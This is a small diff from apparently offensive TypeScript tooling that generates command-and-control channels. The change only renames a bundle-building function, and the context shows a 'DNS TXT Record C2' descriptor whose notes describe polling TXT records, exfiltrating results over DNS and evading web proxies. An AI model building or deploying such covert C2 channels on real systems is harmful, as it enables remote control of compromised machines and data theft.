@@ -279,7 +279,7 @@ done &`;
   return { id:"dns_txt_c2", name:"DNS TXT Record C2", kind:"polling", command:sh, notes:"Pure DNS C2 — polls cmd*.domain TXT records every 60s. Exfil response via DNS lookups. Works through all web proxies. Port 53 UDP only." };
 }
 
-export function buildC2PollerBundle(lhost: string, lport: string, cbUrl: string): C2PollerBundle[] {
+export function buildAdvancedC2Bundles(lhost: string, lport: string, cbUrl: string): C2PollerBundle[] {
   const domain = oobHost(cbUrl);
   return [
     buildHttpPollerC2(lhost, lport, cbUrl),
